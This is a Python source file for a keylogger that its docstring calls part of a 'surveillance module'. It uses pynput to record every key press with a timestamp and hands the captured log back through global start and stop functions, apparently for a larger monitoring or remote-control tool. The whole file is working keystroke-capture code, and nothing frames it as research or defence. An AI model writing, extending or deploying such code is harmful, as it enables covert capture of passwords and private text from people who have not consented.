"""Keylogger functionality for surveillance module"""
import threading
import time
from datetime import datetime
import logging
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log = []
        self.running = False
        self.lock = threading.Lock()
        self.listener = None
        
    def on_press(self, key):
        """Callback for key press events"""
        try:
            with self.lock:
                timestamp = datetime.now().isoformat()
                if hasattr(key, 'char'):
                    self.log.append({
                        'timestamp': timestamp,
                        'type': 'char',
                        'key': key.char
                    })
                else:
                    self.log.append({
                        'timestamp': timestamp,
                        'type': 'special',
                        'key': str(key)
                    })
        except Exception as e:
            logging.error(f"Error in keylogger: {str(e)}")
            
    def start(self):
        """Start the keylogger"""
        if not self.running:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            return {'status': 'success', 'message': 'Keylogger started'}
        return {'status': 'error', 'message': 'Keylogger already running'}
            
    def stop(self):
        """Stop the keylogger"""
        if self.running:
            self.running = False
            if self.listener:
                self.listener.stop()
            log_copy = self.log.copy()
            self.log.clear()
            return {
                'status': 'success',
                'message': 'Keylogger stopped',
                'data': log_copy
            }
        return {'status': 'error', 'message': 'Keylogger not running'}

# Global keylogger instance
_keylogger = None

def start_keylogger():
    """Start the keylogger"""
    global _keylogger
    try:
        if _keylogger is None:
            _keylogger = Keylogger()
        return _keylogger.start()
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def stop_keylogger():
    """Stop the keylogger and get the log"""
    global _keylogger
    try:
        if _keylogger is not None:
            result = _keylogger.stop()
            _keylogger = None
            return result
        return {'status': 'error', 'message': 'Keylogger not initialized'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)} 